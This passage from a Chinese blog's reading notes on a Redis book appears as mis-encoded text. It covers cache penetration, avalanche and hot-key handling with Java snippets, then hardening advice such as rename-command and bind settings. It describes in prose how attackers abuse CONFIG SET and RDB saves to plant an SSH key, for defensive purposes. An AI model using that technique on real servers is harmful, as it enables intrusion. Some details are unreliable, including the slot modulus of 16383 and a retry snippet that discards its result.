è¿‡æœŸæ—¶é—´è®¾ç½®ä¸º5åˆ†é’Ÿï¼Œå¦‚æœæ­¤æ—¶å­˜å‚¨å±‚æ·»åŠ äº†è¿™ä¸ªæ•°æ®ï¼Œé‚£æ­¤æ®µæ—¶é—´å°±ä¼šå‡ºç°ç¼“å­˜å±‚å’Œå­˜å‚¨å±‚æ•°æ®çš„ä¸ä¸€è‡´ï¼Œæ­¤æ—¶å¯ä»¥åˆ©ç”¨æ¶ˆæ¯ç³»ç»Ÿæˆ–è€…å…¶ä»–æ–¹å¼æ¸…é™¤æ‰ç¼“å­˜å±‚ä¸­çš„ç©ºå¯¹è±¡ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">String <span class="title">get</span><span class="params">(String key)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ä»ç¼“å­˜ä¸­è·å–æ•°æ®</span></span><br><span class="line">    String cacheValue = cache.get(key);</span><br><span class="line">    <span class="comment">// ç¼“å­˜ä¸ºç©º</span></span><br><span class="line">    <span class="keyword">if</span> (StringUtils.isBlank(cacheValue)) &#123;</span><br><span class="line">        <span class="comment">// ä»å­˜å‚¨ä¸­è·å–</span></span><br><span class="line">        String storageValue = storage.get(key);</span><br><span class="line">        cache.set(key, storageValue);</span><br><span class="line">        <span class="comment">// å¦‚æœå­˜å‚¨æ•°æ®ä¸ºç©ºï¼Œéœ€è¦è®¾ç½®ä¸€ä¸ªè¿‡æœŸæ—¶é—´(300ç§’)</span></span><br><span class="line">        <span class="keyword">if</span> (storageValue == <span class="keyword">null</span>) &#123;</span><br><span class="line">            cache.expire(key, <span class="number">60</span> * <span class="number">5</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> storageValue;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// ç¼“å­˜éç©º</span></span><br><span class="line">        <span class="keyword">return</span> cacheValue;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g9enly0i2dj30g10i1ac8.jpg" alt=""></p><h4 id="2-å¸ƒéš†è¿‡æ»¤å™¨æ‹¦æˆª"><a href="#2-å¸ƒéš†è¿‡æ»¤å™¨æ‹¦æˆª" class="headerlink" title="2. å¸ƒéš†è¿‡æ»¤å™¨æ‹¦æˆª"></a>2. å¸ƒéš†è¿‡æ»¤å™¨æ‹¦æˆª</h4><p>å¦‚å›¾æ‰€ç¤ºï¼Œåœ¨è®¿é—®ç¼“å­˜å±‚å’Œå­˜å‚¨å±‚ä¹‹å‰ï¼Œå°†å­˜åœ¨çš„keyç”¨å¸ƒéš†è¿‡æ»¤å™¨æå‰ä¿å­˜èµ·æ¥ï¼Œåšç¬¬ä¸€å±‚æ‹¦æˆªã€‚ä¾‹å¦‚ï¼šä¸€ä¸ªæ¨èç³»ç»Ÿæœ‰4äº¿ä¸ªç”¨æˆ·idï¼Œæ¯ä¸ªå°æ—¶ç®—æ³•å·¥ç¨‹å¸ˆä¼šæ ¹æ®æ¯ä¸ªç”¨æˆ·ä¹‹å‰å†å²è¡Œä¸ºè®¡ç®—å‡ºæ¨èæ•°æ®æ”¾åˆ°å­˜å‚¨å±‚ä¸­ï¼Œä½†æ˜¯æœ€æ–°çš„ç”¨æˆ·ç”±äºæ²¡æœ‰å†å²è¡Œä¸ºï¼Œå°±ä¼šå‘ç”Ÿç¼“å­˜ç©¿é€çš„è¡Œä¸ºï¼Œä¸ºæ­¤å¯ä»¥å°†æ‰€æœ‰æ¨èæ•°æ®çš„ç”¨æˆ·åšæˆå¸ƒéš†è¿‡æ»¤å™¨ã€‚å¦‚æœå¸ƒéš†è¿‡æ»¤å™¨è®¤ä¸ºè¯¥ç”¨æˆ·idä¸å­˜åœ¨ï¼Œé‚£ä¹ˆå°±ä¸ä¼šè®¿é—®å­˜å‚¨å±‚ï¼Œåœ¨ä¸€å®šç¨‹åº¦ä¿æŠ¤äº†å­˜å‚¨å±‚ã€‚</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g9enotipdrj30in0hvq5t.jpg" alt=""></p><blockquote><p>å¯ä»¥åˆ©ç”¨ Redis çš„ Bitmaps å®ç°å¸ƒéš†è¿‡æ»¤å™¨ã€‚ç±»ä¼¼å¼€æºæ–¹æ¡ˆå¯æŸ¥çœ‹ <a href="https://github.com/erikdubbelboer/redis-lua-scaling-bloom-filter" target="_blank" rel="noopener">https://github.com/erikdubbelboer/redis-lua-scaling-bloom-filter</a></p></blockquote><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g9ens6v1czj30md068q4q.jpg" alt=""></p><h2 id="æ— åº•æ´ä¼˜åŒ–"><a href="#æ— åº•æ´ä¼˜åŒ–" class="headerlink" title="æ— åº•æ´ä¼˜åŒ–"></a>æ— åº•æ´ä¼˜åŒ–</h2><p>æ— åº•æ´æ˜¯æŒ‡ï¼Œé‡‡ç”¨åˆ†å¸ƒå¼æå‡ç¼“å­˜çš„èƒ½åŠ›ï¼Œä½†åˆ†å¸ƒå¼æ¶æ„åˆå¼•å‘äº†<code>mget</code>ç­‰æ‰¹é‡æ“ä½œå‘½ä»¤çš„å¤šæ¬¡ç½‘ç»œè¿æ¥é€ æˆçš„æ€§èƒ½ä¸‹é™ã€‚å› æ­¤ï¼Œæ›´å¤šçš„èŠ‚ç‚¹ä¸ä»£è¡¨æ›´é«˜çš„æ€§èƒ½ï¼Œæ‰€è°“â€œæ— åº•<br>æ´â€å°±æ˜¯è¯´æŠ•å…¥è¶Šå¤šä¸ä¸€å®šäº§å‡ºè¶Šå¤šã€‚ä½†æ˜¯åˆ†å¸ƒå¼åˆæ˜¯ä¸å¯ä»¥é¿å…çš„ï¼Œå› ä¸ºè®¿é—®é‡å’Œæ•°æ®é‡è¶Šæ¥è¶Šå¤§ï¼Œä¸€ä¸ªèŠ‚ç‚¹æ ¹æœ¬æŠ—ä¸ä½ï¼Œæ‰€ä»¥å¦‚ä½•é«˜æ•ˆåœ°åœ¨åˆ†å¸ƒå¼ç¼“å­˜ä¸­æ‰¹é‡æ“ä½œæ˜¯ä¸€ä¸ªéš¾ç‚¹ã€‚</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g9enykatrkj30lu0m9tf4.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g9enz0x9eaj30mh0jsgr7.jpg" alt=""></p><p>æ— åº•æ´é—®é¢˜çš„ä¼˜åŒ–æ–¹æ¡ˆï¼š</p><ul><li><p>å‘½ä»¤æœ¬èº«çš„ä¼˜åŒ–ï¼Œä¾‹å¦‚ä¼˜åŒ–SQLè¯­å¥ç­‰ã€‚</p></li><li><p>å‡å°‘ç½‘ç»œé€šä¿¡æ¬¡æ•°ã€‚</p><ul><li>å®¢æˆ·ç«¯næ¬¡get(ä¸²è¡Œæ‰§è¡Œ)ï¼šnæ¬¡ç½‘ç»œ+næ¬¡getå‘½ä»¤æœ¬èº«ã€‚<ul><li>å³é€æ¬¡æ‰§è¡Œnä¸ªgetå‘½ä»¤ï¼Œè¿™ç§æ“ä½œæ—¶é—´å¤æ‚åº¦è¾ƒé«˜ï¼Œä½†å®ç°ä¹Ÿæœ€ç®€å•ã€‚</li></ul></li><li>å®¢æˆ·ç«¯1æ¬¡pipeline get(ä¸²è¡ŒI/O)ï¼š1æ¬¡ç½‘ç»œ+næ¬¡getå‘½ä»¤æœ¬èº«ã€‚<ul><li>Redis Clusterä½¿ç”¨CRC16ç®—æ³•è®¡ç®—å‡ºæ•£åˆ—å€¼ï¼Œå†å–å¯¹16383çš„ä½™æ•°å°±å¯ä»¥ç®—å‡ºslotå€¼ï¼ŒåŒæ—¶Smartå®¢æˆ·ç«¯ä¼šä¿å­˜slotå’ŒèŠ‚ç‚¹çš„å¯¹åº”å…³ç³»ï¼Œæœ‰äº†è¿™ä¸¤ä¸ªæ•°æ®å°±å¯ä»¥å°†å±äºåŒä¸€ä¸ªèŠ‚ç‚¹çš„keyè¿›è¡Œå½’æ¡£ï¼Œå¾—åˆ°æ¯ä¸ªèŠ‚ç‚¹çš„keyå­åˆ—è¡¨ï¼Œä¹‹åå¯¹æ¯ä¸ªèŠ‚ç‚¹æ‰§è¡Œmgetæˆ–è€…Pipelineæ“ä½œï¼Œå®ƒçš„æ“ä½œæ—¶é—´=nodeæ¬¡ç½‘ç»œæ—¶é—´+næ¬¡å‘½ä»¤æ—¶é—´ï¼Œç½‘ç»œæ¬¡æ•°æ˜¯nodeçš„ä¸ªæ•°ï¼Œå¾ˆæ˜æ˜¾è¿™ç§æ–¹æ¡ˆæ¯”ç¬¬ä¸€ç§è¦å¥½å¾ˆå¤šï¼Œä½†æ˜¯å¦‚æœèŠ‚ç‚¹æ•°å¤ªå¤šï¼Œè¿˜æ˜¯æœ‰ä¸€å®šçš„æ€§èƒ½é—®é¢˜ã€‚</li></ul></li><li>å®¢æˆ·ç«¯1æ¬¡mget(å¹¶è¡ŒI/O)ï¼š1æ¬¡ç½‘ç»œ+1æ¬¡mgetå‘½ä»¤æœ¬èº«ã€‚<ul><li>æ­¤æ–¹æ¡ˆæ˜¯å°†æ–¹æ¡ˆ2ä¸­çš„æœ€åä¸€æ­¥æ”¹ä¸ºå¤šçº¿ç¨‹æ‰§è¡Œï¼Œç½‘ç»œæ¬¡æ•°è™½ç„¶è¿˜æ˜¯èŠ‚ç‚¹ä¸ªæ•°ï¼Œä½†ç”±äºä½¿ç”¨å¤šçº¿ç¨‹ç½‘ç»œæ—¶é—´å˜ä¸º$O(1)$ï¼Œè¿™ç§æ–¹æ¡ˆä¼šå¢åŠ ç¼–ç¨‹çš„å¤æ‚åº¦ã€‚å…¶æ“ä½œæ—¶é—´ä¸ºï¼š<code>max_slow(nodeç½‘ç»œæ—¶é—´)+næ¬¡å‘½ä»¤æ—¶é—´</code></li></ul></li><li>Redis Clusterçš„<code>hash_tag</code>å¯ä»¥å°†å¤šä¸ªkeyå¼ºåˆ¶åˆ†é…åˆ°ä¸€ä¸ªèŠ‚ç‚¹ä¸Šï¼Œå®ƒçš„æ“ä½œæ—¶é—´=1æ¬¡ç½‘ç»œæ—¶é—´+næ¬¡å‘½ä»¤æ—¶é—´ã€‚</li></ul></li><li><p>é™ä½æ¥å…¥æˆæœ¬ï¼Œä¾‹å¦‚å®¢æˆ·ç«¯ä½¿ç”¨é•¿è¿/è¿æ¥æ± ã€NIO(Non-blocking I/O)ç­‰ã€‚</p></li></ul><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g9eoakg0wrj30md0g0jty.jpg" alt=""></p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g9eo4ku5pyj30mg095acq.jpg" alt=""></p><h2 id="é›ªå´©ä¼˜åŒ–"><a href="#é›ªå´©ä¼˜åŒ–" class="headerlink" title="é›ªå´©ä¼˜åŒ–"></a>é›ªå´©ä¼˜åŒ–</h2><p>ç¼“å­˜é›ªå´©ï¼šå¦‚æœç¼“å­˜å±‚ç”±äºæŸäº›åŸå› ä¸èƒ½æä¾›æœåŠ¡ï¼Œäºæ˜¯æ‰€æœ‰çš„è¯·æ±‚éƒ½ä¼šè¾¾åˆ°å­˜å‚¨å±‚ï¼Œå­˜å‚¨å±‚çš„è°ƒç”¨é‡ä¼šæš´å¢ï¼Œé€ æˆå­˜å‚¨å±‚ä¹Ÿä¼šçº§è”å®•æœºçš„æƒ…å†µã€‚<br><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g9eobx2323j30m20ed0vb.jpg" alt=""></p><p>ä¼˜åŒ–æ–¹æ¡ˆå¦‚ä¸‹ï¼š</p><ol><li>ä¿è¯ç¼“å­˜å±‚æœåŠ¡é«˜å¯ç”¨æ€§ã€‚Redis Sentinelå’ŒRedis Clusteréƒ½å®ç°äº†é«˜å¯ç”¨ã€‚</li><li>ä¾èµ–éš”ç¦»ç»„ä»¶ä¸ºåç«¯é™æµå¹¶é™çº§ã€‚ä½œä¸ºå¹¶å‘é‡è¾ƒå¤§çš„ç³»ç»Ÿï¼Œå‡å¦‚æœ‰ä¸€ä¸ªèµ„æºä¸å¯ç”¨ï¼Œå¯èƒ½ä¼šé€ æˆçº¿ç¨‹å…¨éƒ¨é˜»å¡åœ¨è¿™ä¸ªèµ„æºä¸Šï¼Œé€ æˆæ•´ä¸ªç³»ç»Ÿä¸å¯ç”¨ã€‚é™çº§æœºåˆ¶åœ¨é«˜å¹¶å‘ç³»ç»Ÿä¸­æ˜¯éå¸¸æ™®éçš„ï¼šæ¯”å¦‚æ¨èæœåŠ¡ä¸­ï¼Œå¦‚æœä¸ªæ€§åŒ–æ¨èæœåŠ¡ä¸å¯ç”¨ï¼Œå¯ä»¥é™çº§è¡¥å……çƒ­ç‚¹æ•°æ®ï¼Œä¸è‡³äºé€ æˆå‰ç«¯é¡µé¢æ˜¯å¼€å¤©çª—ã€‚åœ¨å®é™…é¡¹ç›®ä¸­ï¼Œæˆ‘ä»¬éœ€è¦å¯¹é‡è¦çš„èµ„æºï¼ˆä¾‹å¦‚Redisã€MySQLã€HBaseã€å¤–éƒ¨æ¥å£ï¼‰éƒ½è¿›è¡Œéš”ç¦»ï¼Œè®©æ¯ç§èµ„æºéƒ½å•ç‹¬è¿è¡Œåœ¨è‡ªå·±çš„çº¿ç¨‹æ± ä¸­ï¼Œå³ä½¿ä¸ªåˆ«èµ„æºå‡ºç°äº†é—®é¢˜ï¼Œå¯¹å…¶ä»–æœåŠ¡æ²¡æœ‰å½±å“ã€‚</li><li>æå‰æ¼”ç»ƒã€‚åœ¨é¡¹ç›®ä¸Šçº¿å‰ï¼Œæ¼”ç»ƒç¼“å­˜å±‚å®•æ‰åï¼Œåº”ç”¨ä»¥åŠåç«¯çš„è´Ÿè½½æƒ…å†µä»¥åŠå¯èƒ½å‡ºç°çš„é—®é¢˜ï¼Œåœ¨æ­¤åŸºç¡€ä¸Šåšä¸€äº›é¢„æ¡ˆè®¾å®šã€‚</li></ol><h2 id="çƒ­ç‚¹keyé‡å»ºä¼˜åŒ–"><a href="#çƒ­ç‚¹keyé‡å»ºä¼˜åŒ–" class="headerlink" title="çƒ­ç‚¹keyé‡å»ºä¼˜åŒ–"></a>çƒ­ç‚¹keyé‡å»ºä¼˜åŒ–</h2><p>åœ¨ç¼“å­˜å¤±æ•ˆçš„ç¬é—´ï¼Œæœ‰å¤§é‡çº¿ç¨‹æ¥é‡å»ºç¼“å­˜ï¼Œé€ æˆåç«¯è´Ÿè½½åŠ å¤§ï¼Œç”šè‡³å¯èƒ½ä¼šè®©åº”ç”¨å´©æºƒã€‚</p><p>è§£å†³çƒ­ç‚¹ key é‡å»ºçš„æ€è·¯ï¼š</p><ul><li>å‡å°‘é‡å»ºç¼“å­˜çš„æ¬¡æ•°ã€‚</li><li>æ•°æ®å°½å¯èƒ½ä¸€è‡´ã€‚</li><li>è¾ƒå°‘çš„æ½œåœ¨å±é™©ã€‚</li></ul><h3 id="è§£å†³æ–¹æ¡ˆ"><a href="#è§£å†³æ–¹æ¡ˆ" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h3><h4 id="äº’æ–¥é”-mutex-key"><a href="#äº’æ–¥é”-mutex-key" class="headerlink" title="äº’æ–¥é”(mutex key)"></a>äº’æ–¥é”(mutex key)</h4><p>æ­¤æ–¹æ³•åªå…è®¸ä¸€ä¸ªçº¿ç¨‹é‡å»ºç¼“å­˜ï¼Œå…¶ä»–çº¿ç¨‹ç­‰å¾…é‡å»ºç¼“å­˜çš„çº¿ç¨‹æ‰§è¡Œå®Œï¼Œé‡æ–°ä»ç¼“å­˜è·å–æ•°æ®å³å¯ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">String <span class="title">get</span><span class="params">(String key)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ä»Redisä¸­è·å–æ•°æ®</span></span><br><span class="line">    String value = redis.get(key);</span><br><span class="line">    <span class="comment">// å¦‚æœvalueä¸ºç©ºï¼Œåˆ™å¼€å§‹é‡æ„ç¼“å­˜</span></span><br><span class="line">    <span class="keyword">if</span> (value == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// åªå…è®¸ä¸€ä¸ªçº¿ç¨‹é‡æ„ç¼“å­˜ï¼Œä½¿ç”¨nxï¼Œå¹¶è®¾ç½®è¿‡æœŸæ—¶é—´ex</span></span><br><span class="line">        String mutexKey = <span class="string">"mutext:key:"</span> + key;</span><br><span class="line">        <span class="keyword">if</span> (redis.set(mutexKey, <span class="string">"1"</span>, <span class="string">"ex 180"</span>, <span class="string">"nx"</span>)) &#123;</span><br><span class="line">            <span class="comment">// ä»æ•°æ®æºè·å–æ•°æ®</span></span><br><span class="line">            value = db.get(key);</span><br><span class="line">            <span class="comment">// å›å†™Redisï¼Œå¹¶è®¾ç½®è¿‡æœŸæ—¶é—´</span></span><br><span class="line">            redis.setex(key, timeout, value);</span><br><span class="line">            <span class="comment">// åˆ é™¤key_mutex</span></span><br><span class="line">            redis.delete(mutexKey);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// å…¶ä»–çº¿ç¨‹ä¼‘æ¯50æ¯«ç§’åé‡è¯•</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">50</span>);</span><br><span class="line">            get(key);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="æ°¸ä¸è¿‡æœŸ"><a href="#æ°¸ä¸è¿‡æœŸ" class="headerlink" title="æ°¸ä¸è¿‡æœŸ"></a>æ°¸ä¸è¿‡æœŸ</h4><p>æ°¸ä¸è¿‡æœŸåŒ…å«ä¸¤å±‚å«ä¹‰ï¼š</p><ul><li>ä»ç¼“å­˜å±‚é¢æ¥çœ‹ï¼Œç¡®å®æ²¡æœ‰è®¾ç½®è¿‡æœŸæ—¶é—´ï¼Œæ‰€ä»¥ä¸ä¼šå‡ºç°çƒ­ç‚¹keyè¿‡æœŸåäº§ç”Ÿçš„é—®é¢˜ï¼Œä¹Ÿå°±æ˜¯â€œç‰©ç†â€ä¸è¿‡æœŸã€‚</li><li>ä»åŠŸèƒ½å±‚é¢æ¥çœ‹ï¼Œä¸ºæ¯ä¸ªvalueè®¾ç½®ä¸€ä¸ªé€»è¾‘è¿‡æœŸæ—¶é—´ï¼Œå½“å‘ç°è¶…è¿‡é€»è¾‘è¿‡æœŸæ—¶é—´åï¼Œä¼šä½¿ç”¨å•ç‹¬çš„çº¿ç¨‹å»æ„å»ºç¼“å­˜ã€‚</li></ul><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g9eomw75jpj30lp0lt43y.jpg" alt=""></p><p>ä½œä¸ºä¸€ä¸ªå¹¶å‘é‡è¾ƒå¤§çš„åº”ç”¨ï¼Œåœ¨ä½¿ç”¨ç¼“å­˜æ—¶æœ‰ä¸‰ä¸ªç›®æ ‡ï¼šç¬¬ä¸€ï¼ŒåŠ å¿«ç”¨æˆ·è®¿é—®é€Ÿåº¦ï¼Œæé«˜ç”¨æˆ·ä½“éªŒã€‚ç¬¬äºŒï¼Œé™ä½åç«¯è´Ÿè½½ï¼Œå‡å°‘æ½œåœ¨çš„é£é™©ï¼Œä¿è¯ç³»ç»Ÿå¹³ç¨³ã€‚ç¬¬ä¸‰ï¼Œä¿è¯æ•°æ®â€œå°½å¯èƒ½â€åŠæ—¶æ›´æ–°ã€‚</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g9eol3rlkmj30mz07fq4l.jpg" alt=""></p><h1 id="ç¬¬-12-ç« -Devops-çš„é™·é˜±"><a href="#ç¬¬-12-ç« -Devops-çš„é™·é˜±" class="headerlink" title="ç¬¬ 12 ç«  Devops çš„é™·é˜±"></a>ç¬¬ 12 ç«  Devops çš„é™·é˜±</h1><h2 id="Redis-æ”»å‡»"><a href="#Redis-æ”»å‡»" class="headerlink" title="Redis æ”»å‡»"></a>Redis æ”»å‡»</h2><p>æ”»å‡»è€…å……åˆ†åˆ©ç”¨Redisçš„dirå’Œ<code>dbfilename</code>ä¸¤ä¸ªé…ç½®å¯ä»¥ä½¿ç”¨<code>config set</code>åŠ¨æ€è®¾ç½®ï¼Œä»¥åŠRDBæŒä¹…åŒ–çš„ç‰¹æ€§ï¼Œå°†è‡ªå·±çš„å…¬é’¥å†™å…¥åˆ°ç›®æ ‡æœºå™¨çš„<code>/root/.ssh/authotrized_keys</code>æ–‡ä»¶ä¸­ï¼Œä»è€Œå®ç°äº†å¯¹ç›®æ ‡æœºå™¨çš„æ”»é™·ã€‚æ”»å‡»è¿‡ç¨‹å¦‚å›¾ã€‚<br><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9qrmwcp5ij30il0black.jpg" alt=""></p><h2 id="å‘½ä»¤é‡å†™"><a href="#å‘½ä»¤é‡å†™" class="headerlink" title="å‘½ä»¤é‡å†™"></a>å‘½ä»¤é‡å†™</h2><p>Redis ä¸­æä¾›äº†<code>rename-command</code>å‘½ä»¤æ¥é‡å‘½åå‘½ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¯¥å‘½ä»¤å°†ä¸€äº›å±é™©å‘½ä»¤æ”¹å†™ï¼Œå¦‚<code>keys</code>ã€<code>flushall/flushdb</code>ã€<code>save</code>ã€<code>debug</code>(<code>debug reload</code>ä¼šé‡å¯ Redis)ã€<code>config</code>ã€<code>shutdown</code>ã€‚åŒæ—¶ï¼Œ<code>rename-command</code>ä¸æ”¯æŒ<code>config set</code>ï¼Œå¦‚æœAOFå’ŒRDBæ–‡ä»¶åŒ…å«äº†rename-commandä¹‹å‰çš„å‘½ä»¤ï¼ŒRediså°†æ— æ³•å¯åŠ¨ã€‚</p><p><code>rename-command</code>çš„æœ€ä½³å®è·µï¼š</p><ul><li>å¯¹äºä¸€äº›å±é™©çš„å‘½ä»¤ï¼ˆä¾‹å¦‚flushallï¼‰ï¼Œä¸ç®¡æ˜¯å†…ç½‘è¿˜æ˜¯å¤–ç½‘ï¼Œä¸€å¾‹ä½¿ç”¨<code>rename-command</code>é…ç½®</li><li>å»ºè®®ç¬¬ä¸€æ¬¡é…ç½®Redisæ—¶ï¼Œå°±åº”è¯¥é…ç½®<code>rename-command</code>ï¼Œå› ä¸º<code>renamecommand</code>ä¸æ”¯æŒ<code>config set</code>ã€‚</li><li>å¦‚æœæ¶‰åŠä¸»ä»å…³ç³»ï¼Œä¸€å®šè¦ä¿æŒä¸»ä»èŠ‚ç‚¹é…ç½®çš„ä¸€è‡´æ€§ï¼Œå¦åˆ™å­˜åœ¨ä¸»ä»æ•°æ®ä¸ä¸€è‡´çš„å¯èƒ½æ€§ã€‚</li></ul><h2 id="é˜²ç«å¢™"><a href="#é˜²ç«å¢™" class="headerlink" title="é˜²ç«å¢™"></a>é˜²ç«å¢™</h2><p>å¯ä»¥ä½¿ç”¨é˜²ç«å¢™é™åˆ¶è¾“å…¥å’Œè¾“å‡ºçš„IPæˆ–è€…IPèŒƒå›´ã€ç«¯å£æˆ–è€…ç«¯å£èŒƒå›´ã€‚</p><p>å¾ˆå¤šå¼€å‘è€…åœ¨ä¸€å¼€å§‹çœ‹åˆ°bindçš„è¿™ä¸ªé…ç½®æ—¶éƒ½æ˜¯è¿™ä¹ˆè®¤ä¸ºçš„ï¼šæŒ‡å®šRedisåªæ¥æ”¶æ¥è‡ªäºæŸä¸ªç½‘æ®µIPçš„å®¢æˆ·ç«¯è¯·æ±‚ï¼Œä½†<strong>äº‹å®ä¸ŠbindæŒ‡å®šçš„æ˜¯Rediså’Œå“ªä¸ªç½‘å¡è¿›è¡Œç»‘å®š</strong>ï¼Œå’Œå®¢æˆ·ç«¯æ˜¯ä»€ä¹ˆç½‘æ®µæ²¡æœ‰å…³ç³»ã€‚</p><ul><li>å¦‚æœæœºå™¨æœ‰å¤–ç½‘IPï¼Œä½†éƒ¨ç½²çš„Redisæ˜¯ç»™å†…éƒ¨ä½¿ç”¨çš„ï¼Œå»ºè®®å»æ‰å¤–ç½‘ç½‘å¡æˆ–è€…ä½¿ç”¨bindé…ç½®é™åˆ¶æµé‡ä»å¤–ç½‘è¿›å…¥ã€‚</li><li>å¦‚æœå®¢æˆ·ç«¯å’ŒRediséƒ¨ç½²åœ¨ä¸€å°æœåŠ¡å™¨ä¸Šï¼Œå¯ä»¥ä½¿ç”¨å›ç¯åœ°å€ï¼ˆ127.0.0.1ï¼‰ã€‚</li><li>bindé…ç½®ä¸æ”¯æŒ<code>config set</code>ï¼Œæ‰€ä»¥å°½å¯èƒ½åœ¨ç¬¬ä¸€æ¬¡å¯åŠ¨å‰é…ç½®å¥½</li></ul><h2 id="bigkey"><a href="#bigkey" class="headerlink" title="bigkey"></a>bigkey</h2><p>å±å®³ï¼š</p><ul><li>å†…å­˜ç©ºé—´ä¸å‡åŒ€</li><li>è¶…æ—¶é˜»å¡</li><li>ç½‘ç»œæ‹¥å¡</li></ul><p>bigkeyçš„å­˜åœ¨å¹¶ä¸æ˜¯å®Œå…¨è‡´å‘½çš„ï¼Œå¦‚æœè¿™ä¸ªbigkeyå­˜åœ¨ä½†æ˜¯å‡ ä¹ä¸è¢«è®¿é—®ï¼Œé‚£ä¹ˆåªæœ‰å†…å­˜ç©ºé—´ä¸å‡åŒ€çš„é—®é¢˜å­˜åœ¨ï¼Œç›¸å¯¹äºå¦å¤–ä¸¤ä¸ªé—®é¢˜æ²¡æœ‰é‚£ä¹ˆé‡è¦ç´§æ€¥ï¼Œä½†æ˜¯å¦‚æœbigkeyæ˜¯ä¸€ä¸ªçƒ­ç‚¹keyï¼ˆé¢‘ç¹è®¿é—®ï¼‰ï¼Œé‚£ä¹ˆå…¶å¸¦æ¥çš„å±å®³ä¸å¯æƒ³è±¡ï¼Œæ‰€ä»¥åœ¨å®é™…å¼€å‘å’Œè¿ç»´æ—¶ä¸€å®šè¦å¯†åˆ‡å…³æ³¨bigkeyçš„å­˜åœ¨ã€‚</p><h2 id="æŸ¥æ‰¾çƒ­ç‚¹-Key"><a href="#æŸ¥æ‰¾çƒ­ç‚¹-Key" class="headerlink" title="æŸ¥æ‰¾çƒ­ç‚¹ Key"></a>æŸ¥æ‰¾çƒ­ç‚¹ Key</h2><table><thead><tr><th>æ–¹æ¡ˆ</th><th>ä¼˜ç‚¹</th><th>ç¼ºç‚¹</th></tr></thead><tbody><tr><td>å®¢æˆ·ç«¯</td><td>å®ç°ç®€å•</td><td>Â· å†…å­˜æ³„éœ²éšæ‚£<br>Â· ç»´æŠ¤æˆæœ¬é«˜<br>Â· åªèƒ½ç»Ÿè®¡å•ä¸ªå®¢æˆ·ç«¯</td></tr><tr><td>ä»£ç†</td><td>ä»£ç†æ˜¯å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯çš„æ¡¥æ¢ï¼Œå®ç°æœ€æ–¹ä¾¿æœ€ç³»ç»Ÿ</td><td>å¢åŠ ä»£ç†ç«¯çš„æˆæœ¬éƒ¨ç½²å¼€å‘</td></tr><tr><td>æœåŠ¡ç«¯</td><td>å®ç°ç®€å•</td><td>Â· monitor æœ¬èº«çš„ä½¿ç”¨æˆæœ¬å’Œå±å®³ï¼Œåªèƒ½çŸ­æ—¶é—´ä½¿ç”¨<br>Â· åªèƒ½ç»Ÿè®¡å•ä¸ª Redis èŠ‚ç‚¹</td></tr><tr><td>æœºå™¨</td><td>å¯¹äºå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯æ— ä¾µå…¥å’Œå½±å“</td><td>éœ€è¦ä¸“ä¸šçš„è¿ç»´å›¢é˜Ÿå¼€å‘ï¼Œå¹¶ä¸”å¢åŠ äº†æœºå™¨çš„éƒ¨ç½²æˆæœ¬</td></tr></tbody></table><hr><blockquote><p>è¯»åæ„Ÿï¼šRedis æ˜¯ä¸€æ¬¾å¼ºæœ‰åŠ›çš„ç”Ÿäº§åŠ›å·¥å…·ï¼Œåƒä¸€æŠŠç‘å£«å†›åˆ€ï¼Œåªæœ‰ä½ ç†Ÿæ‚‰è‡ªå·±ä½¿ç”¨çš„å·¥å…·ï¼Œæ‰èƒ½æ„å»ºå‡ºä¸€åº§åšå›ºæ¼‚äº®çš„å¤§å¦ã€‚ä½¿ç”¨ä»€ä¹ˆå·¥å…·å†³å®šäº†ä½ çš„ä¸‹é™ï¼Œä½†æ€ä¹ˆä½¿ç”¨å·¥å…·å†³å®šäº†ä½ çš„ä¸Šé™ï¼Œä½ å¯ä»¥ç”¨ Redis 